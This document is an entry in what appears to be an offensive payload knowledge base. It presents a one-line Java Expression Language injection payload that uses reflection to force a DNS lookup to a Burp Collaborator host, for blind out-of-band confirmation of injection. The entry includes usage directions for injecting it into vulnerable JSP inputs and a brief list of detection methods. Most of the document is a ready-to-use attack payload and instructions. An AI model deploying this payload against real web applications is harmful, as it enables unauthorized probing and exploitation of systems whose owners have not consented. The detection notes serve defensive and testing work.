---
id: 9f8013e9-1ae3-4470-838f-99b53648b1c0-part1
type: code
language: Java
verified: true
created_at: '2023-04-06T03:56:38.992439+00:00'
updated_at: '2023-04-10T20:23:47.081793+00:00'
tags:
  - el-injection
  - dns-exfiltration
  - ssti
platforms:
  - Web
  - Java
validated: true
---

# Java-EL-One-Liner-DNS-Lookup

## Code

```java
${("").getClass().forName("java.net.InetAddress").getMethod("getByName",("").getClass()).invoke(null,"xxxxxxxxxxxxxx.burpcollaborator.net")}
```

## Description

This EL one-liner expression uses reflection to invoke the java.net.InetAddress.getByName method, triggering a DNS resolution to an external hostname. It enables blind out-of-band exfiltration in EL injection scenarios by confirming interaction with an attacker-controlled DNS server, without producing visible output on the page.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| xxxxxxxxxxxxxx.burpcollaborator.net | Attacker-controlled hostname for DNS logging | interact.sh (from Burp Collaborator) |

## Usage

Inject this expression into a vulnerable EL-processed input field (e.g., a search parameter in a JSP form). Monitor your DNS collaborator service for incoming resolutions to validate the injection. Useful in reconnaissance phases to confirm EL evaluation without alerting via page changes.

## Detection

- Network monitoring for DNS queries to unusual or external domains from the web server.
- Application logs showing reflective invocations of InetAddress or getByName.
- Web application firewall rules blocking suspicious EL patterns like 'forName("java.net.InetAddress")'.

## Related

- [[procedures/One-Liner-Expression-Language-Injection]]
